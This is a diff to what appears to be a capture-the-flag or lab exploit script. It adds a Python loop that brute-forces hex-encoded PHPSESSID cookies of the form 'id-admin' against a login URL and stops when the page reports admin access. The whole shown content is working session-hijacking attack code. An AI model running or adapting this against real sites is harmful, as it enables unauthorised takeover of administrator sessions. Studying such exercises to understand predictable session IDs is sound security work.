@@ -49,3 +49,23 @@ Decoded:
 # for example, 109-randomusername and 292-randomusername
 # therefore, we can try to bruteforce the id and use 'admin' as the username
 # then, hex encode it
+MIN = 1
+# assuming that we are still using the same max id
+MAX = 640
+data = {
+    'username' : 'admin',
+    'password' : 'randompassword',
+    'submit' : 'submit'
+}
+admin_page = None
+for i in range(MIN, MAX+1):
+    cookie_str = f'{i}-admin'
+    cookie_enc = bytearray(cookie_str, 'utf-8').hex()
+    print(f'Current PHPSESSID value: {cookie_str}', end='\r')
+
+    requests.utils.add_dict_to_cookiejar(session.cookies, { 'PHPSESSID' : cookie_enc })
+    response = session.post(URL, data=data)
+    if re.search(r'You are an admin.', response.text):
+        print(response.text)
+        admin_page = response.text
+        break
